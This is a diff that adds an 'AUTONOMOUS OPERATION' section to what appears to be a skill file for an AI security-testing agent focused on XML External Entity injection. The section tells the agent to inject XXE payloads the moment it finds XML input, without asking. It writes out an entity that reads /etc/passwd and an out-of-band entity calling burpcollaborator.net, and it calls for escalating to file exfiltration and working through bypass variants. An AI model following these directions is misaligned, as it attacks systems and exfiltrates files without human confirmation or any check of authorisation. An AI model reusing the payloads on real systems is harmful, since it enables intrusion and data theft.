@@ -10,6 +10,17 @@ metadata:
 
 # XXE Phantom — XML External Entity Injection
 
+## AUTONOMOUS OPERATION
+
+When XML is accepted or an XML-based format is uploaded, test for XXE immediately.
+
+- **XML endpoint found**: Inject `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` and reference `&xxe;` — do not ask "should I test for XXE?".
+- **No visible output**: Switch to OOB blind XXE via `<!ENTITY xxe SYSTEM "http://burpcollaborator.net">` immediately.
+- **SVG/DOCX/SAML upload**: Inject XXE payload into the file/document structure without asking.
+- **Blind XXE confirmed via OOB**: Escalate to file read via out-of-band exfiltration DTD immediately.
+- **Parser blocking external entities**: Try XInclude, parameter entities, and DOCTYPE-less XXE variants in order.
+- **Only stop for**: Payloads that could cause parser crashes or server-side resource exhaustion.
+
 XXE occurs when an XML parser evaluates external entity declarations (`<!ENTITY xxe SYSTEM "...">`) supplied by the attacker. Impact ranges from local file disclosure to full SSRF and, in some stacks, Remote Code Execution.
 
 ---
